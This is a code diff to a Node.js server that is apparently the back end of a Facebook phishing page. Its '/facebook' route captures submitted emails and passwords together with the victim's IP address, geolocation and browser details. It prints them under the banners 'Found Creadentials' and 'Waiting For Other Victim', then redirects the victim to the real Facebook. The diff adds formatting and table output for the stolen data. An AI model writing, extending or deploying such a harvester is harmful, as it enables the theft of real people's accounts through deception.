@@ -4,6 +4,7 @@ const geoip = require("geoip-lite"); // npm install --save geoip-lite
 const Sniffr = require("sniffr"); // npm install --save sniffr
 const requestIp = require("request-ip"); // npm install --save request-ip
 
+
 const HOST = process.env.HOST || "0.0.0.0";
 const PORT = process.env.PORT || 3000;
 
@@ -27,11 +28,23 @@ app.post("/facebook", (req, res) => {
   res.statusCode = 200;
   res.setHeader("Content-Type", "application/json");
 
+  let data = JSON.stringify(
+    {
+      email,
+      password,
+      ...startSniff,
+      clientIp,
+      geo
+    },
+    null,
+    2
+  );
+
+  var parseData = JSON.parse(data);
+
   console.log(
     `
-    
-    """"""""""""""""""""""""""" Found Creadentials """""""""""""""""""""""""""""""""
-    
+     """"""""""""""""""""""""""" Found Creadentials """"""""""""""""""""""""""""""""" 
     `,
     JSON.stringify(
       {
@@ -45,8 +58,13 @@ app.post("/facebook", (req, res) => {
       2
     )
   );
+
+  console.table(parseData);
+
   console.log(
-    `""""""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""`
+    `
+    """"""""""""""""""""""""""" Waiting For Other Victim """""""""""""""""""""""""""""""""
+    `
   );
 
   return res.redirect("http://www.facebook.com");
